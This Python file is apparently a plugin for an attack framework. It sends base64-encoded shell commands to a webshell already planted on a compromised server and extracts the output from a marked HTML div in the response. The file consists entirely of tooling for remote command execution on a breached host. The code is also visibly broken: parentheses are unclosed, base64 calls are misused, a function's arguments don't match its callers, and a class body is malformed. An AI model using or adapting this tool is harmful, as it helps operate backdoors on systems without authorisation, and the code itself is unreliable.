"""
a plugin for interfacing with an already-established webshell

submits commands as base64 encoded HTTP params and pulls embedded command output from HTTP response body
"""

import base64

import requests
import bs4

def _get(delim, param, command, url):
    command = base64.encode(command).encode()

    response = requests.get(url, params={param: command})

    if response.status_code != 200:
        return (1, "request returned code {}\nresponse data:\n{}".format(response.status_code, response.text)

    # in the future we should support multiple means of yoinking the payload.
    # but for now, this is hardcoded. we expect the b64 payload to be specified
    # by the response like so:
    #     <div class="evil">payload</div>
    soup = bs4.BeautifulSoup(response.text)
    evils = soup.find_all('div',class_='evil')

    if len(evils) != 1:
        return (2, 'expected exactly 1 <div class="evil"> payloads but found {}'.format(len(evils)))

    payload = base64.decode(unicode(evils[0].string).encode()).decode()

    return (0, payload)

def _post(param, command, url):
    command = base64.encode(command).encode()

    response = requests.post(url, data={param: command})

    if response.status_code != 200:
        return (1, "request returned code {}\nresponse data:\n{}".format(response.status_code, response.text)

    soup = bs4.BeautifulSoup(response.text)
    evils = soup.find_all('div',class_='evil')

    if len(evils) != 1:
        return (2, 'expected exactly 1 <div class="evil"> payloads but found {}'.format(len(evils)))

    payload = base64.decode(unicode(evils[0].string).encode()).decode()

    return (0, payload)

_methods = {
    "get":  _get,
    "post": _post
}

class _Plug():
    self.usage = (
        "USAGE:\n"
        "  webshell {post|get} PARAM URL\n"
        "    post - submit a POST request\n"
        "    get - submit a GET request\n"
        "    PARAM - the POST/GET parameter name to set to each command\n"
        "    URL - the URL to request\n"

    def init_session(self, *args):
        if len(args) != 3:
            return "Expected 3 arguments but received {}".format(len(args))

        method, self.param, self.url = args

        if method not in _methods:
            return "Expected 'get' or 'post' method but received {}".format(method)

        self.method = _methods[method]

    def exit_session(self):
        pass

    def command(self, bstr):
        return (self.method)(self.param, bstr, self.url)

plugin = _Plug()

